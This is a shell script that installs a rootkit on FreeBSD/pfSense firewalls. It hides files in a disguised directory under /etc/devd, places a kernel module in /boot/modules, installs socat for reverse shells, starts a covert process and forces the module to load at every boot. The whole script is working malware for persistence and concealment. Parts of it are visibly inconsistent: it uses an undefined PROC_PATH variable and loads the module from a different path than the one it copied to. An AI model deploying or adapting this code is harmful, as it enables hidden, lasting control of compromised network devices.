#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

# make writable
mount -o rw /
# make maliocus directory
mkdir /etc/devd/conf_backs
# define new directory to hide things in and LKM name
LKM_PROC="/etc/devd/conf_backs"
LKM_NAME="LD_PRELOAD.ko"

# put the rootkit in the modules
cp "$LKM_NAME" /boot/modules/
# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install socat -y

# executable
chmod +x apeshit
# put the process in the hidden directory
cp "apeshit" "$PROC_PATH/"

# run the daemon/process that does nothing that we intend to fork
cd "$PROC_PATH"
./apeshit &

# achieve persistance by loading the module everytime the system boots
# Ensure kld_list includes the LKM
touch /boot/loader.conf.local
chmod 777 /boot/loader.conf.local
echo 'LD_PRELOAD_load="YES"' >> /boot/loader.conf.local

# Disable kldxref by setting kldxref_enable="NO"
sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf

kldload "/Apekit-rootshit/$LKM_NAME"